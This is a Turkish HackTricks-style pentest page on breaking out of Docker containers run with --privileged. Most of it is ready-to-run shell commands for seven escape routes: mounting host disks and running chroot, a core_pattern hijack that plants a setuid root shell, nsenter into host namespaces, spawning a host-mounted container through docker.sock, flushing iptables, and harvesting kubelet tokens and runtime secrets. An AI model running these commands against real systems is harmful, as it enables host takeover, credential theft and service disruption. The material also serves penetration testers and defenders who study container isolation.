# `--privileged` Container'larından Kaçış

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

`--privileged` ile başlatılan bir container, bir veya iki ek izne sahip normal bir container ile aynı şey değildir. Uygulamada `--privileged`, workload'u normalde tehlikeli host kaynaklarından uzak tutan varsayılan runtime korumalarının birkaçını kaldırır veya zayıflatır. Kesin etki runtime'a ve host'a bağlıdır, ancak Docker için genel sonuç şudur:

- tüm capabilities verilir
- device cgroup kısıtlamaları kaldırılır
- birçok kernel filesystem'ı salt okunur olarak mount edilmez
- varsayılan masked procfs yolları ortadan kalkar
- seccomp filtering devre dışı bırakılır
- AppArmor confinement devre dışı bırakılır
- SELinux isolation devre dışı bırakılır veya çok daha geniş bir label ile değiştirilir

Önemli sonuç şudur: privileged bir container'ın genellikle ince bir kernel exploit'ine ihtiyacı **yoktur**. Çoğu durumda host device'ları, host'a yönelik kernel filesystem'larını veya runtime interface'lerini doğrudan kullanabilir ve ardından bir host shell'e pivot edebilir.

## `--privileged` Otomatik Olarak Neleri Değiştirmez?

`--privileged`, host PID, network, IPC veya UTS namespace'lerine otomatik olarak katılmaz. Privileged bir container hâlâ private namespace'lere sahip olabilir. Bu, bazı escape chain'lerinin aşağıdakiler gibi ek bir koşul gerektirdiği anlamına gelir:

- bir host bind mount'u
- host PID paylaşımı
- host networking
- görünür host device'ları
- yazılabilir proc/sys interface'leri

Bu koşulları gerçek misconfiguration'larda karşılamak genellikle kolaydır, ancak kavramsal olarak `--privileged` özelliğinin kendisinden ayrıdır.

## Escape Yolları

### 1. Exposed Device'lar Üzerinden Host Disk'ini Mount Etme

Privileged bir container genellikle `/dev` altında çok daha fazla device node görür. Host block device'ı görünür durumdaysa en basit escape yöntemi, bunu mount etmek ve host filesystem'ına `chroot` uygulamaktır:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Root partition belirgin değilse, önce block layout'u enumerate edin:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Pratik yol `chroot` yerine yazılabilir bir host mount'ına bir setuid helper yerleştirmekse, her filesystem'ın setuid bitini desteklemediğini unutmayın. Host tarafında hızlı bir capability kontrolü şöyledir:
```bash
mount | grep -v "nosuid"
```
Bu, `nosuid` dosya sistemleri altındaki yazılabilir yolların klasik "bir setuid shell bırakıp daha sonra çalıştırma" iş akışları için çok daha az ilgi çekici olması nedeniyle kullanışlıdır.

Burada kötüye kullanılan zayıflatılmış korumalar şunlardır:

- tüm cihazların erişime açılması
- geniş yetkiler, özellikle `CAP_SYS_ADMIN`

İlgili sayfalar:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Bir Host Bind Mount'u Mount Etme veya Yeniden Kullanma ve `chroot`

Host root dosya sistemi zaten container içinde mount edilmişse veya container privileged olduğu için gerekli mount işlemlerini oluşturabiliyorsa, host shell'ine ulaşmak çoğu zaman yalnızca bir `chroot` uzağındadır:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Host root bind mount mevcut değilse ancak host storage erişilebiliyorsa bir tane oluşturun:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Bu yol şunları abuse eder:

- zayıflatılmış mount kısıtlamaları
- full capabilities
- MAC confinement eksikliği

İlgili sayfalar:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Yazılabilir `/proc/sys` Veya `/sys` Abuse Etme

`--privileged` kullanımının en önemli sonuçlarından biri, procfs ve sysfs korumalarının çok daha zayıf hâle gelmesidir. Bu durum, normalde maskelenen veya salt okunur olarak mount edilen host'a yönelik kernel arayüzlerini açığa çıkarabilir.

Klasik bir örnek `core_pattern`'dır:<sup>[[1]](#references)</sup>
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Diğer yüksek değerli yollar şunlardır:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Bu yöntem şunları kötüye kullanır:

- eksik masked paths
- eksik read-only system paths

İlgili sayfalar:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Mount- veya Namespace-Based Escape İçin Full Capabilities Kullanma

Ayrıcalıklı bir container, standart container'larda normalde kaldırılan capabilities'leri alır; bunlar arasında `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` ve daha birçok capability bulunur. Bu, başka bir exposed surface mevcut olduğunda local foothold'u host escape'e dönüştürmek için çoğu zaman yeterlidir.

Basit bir örnek, ek filesystem'leri mount etmek ve namespace entry kullanmaktır:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Host PID'si de paylaşılıyorsa adım daha da kısalır:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Bu yöntem şunları kötüye kullanır:

- varsayılan privileged capability seti
- isteğe bağlı host PID paylaşımı

İlgili sayfalar:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Runtime Sockets Üzerinden Escape

Privileged bir container çoğu zaman host runtime durumunu veya socket'lerini görünür hâle getirir. Bir Docker, containerd veya CRI-O socket'ine erişilebiliyorsa en basit yaklaşım genellikle runtime API'yi kullanarak host erişimine sahip ikinci bir container başlatmaktır:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
containerd için:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Bu path şunları abuse eder:

- privileged runtime exposure
- runtime aracılığıyla oluşturulan host bind mounts

İlgili sayfalar:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Network Isolation Yan Etkilerini Kaldırma

`--privileged`, tek başına host network namespace'ine katılmaz; ancak container'da ayrıca `--network=host` veya başka bir host-network erişimi varsa, ağ stack'inin tamamı değiştirilebilir hale gelir:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Bu her zaman doğrudan bir host shell'i sağlamaz; ancak hizmet engelleme, trafik interception'ı veya yalnızca loopback üzerinden erişilebilen yönetim servislerine erişim sağlayabilir.

İlgili sayfalar:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Host Secret'larını ve Runtime Durumunu Oku

Temiz bir shell escape hemen gerçekleşmese bile, privileged container'lar genellikle host secret'larını, kubelet durumunu, runtime metadata'sını ve komşu container'ların dosya sistemlerini okuyabilecek kadar erişime sahiptir:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
`/var` host-mounted ise veya runtime dizinleri görünür durumdaysa, host shell elde edilmeden önce bile bu durum lateral movement ya da cloud/Kubernetes credential theft için yeterli olabilir.

İlgili sayfalar:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Kontroller

Aşağıdaki komutların amacı, hangi privileged-container escape türlerinin hemen uygulanabilir olduğunu doğrulamaktır.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Burada ilgi çekici olanlar:

- özellikle `CAP_SYS_ADMIN` olmak üzere tam capability seti
- yazılabilir proc/sys exposure
- görünür host cihazları
- eksik seccomp ve MAC confinement
- runtime socket'leri veya host root bind mount'ları

Bunlardan herhangi biri post-exploitation için yeterli olabilir. Birkaçı bir arada olduğunda bu genellikle container'ın host'un ele geçirilmesine bir veya iki komut uzaklıkta olduğu anlamına gelir.

## İlgili Sayfalar

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

## Referanslar

- [1] [Escaping privileged containers for fun](https://pwning.systems/posts/escaping-containers-for-fun/)

{{#include ../../../banners/hacktricks-training.md}}
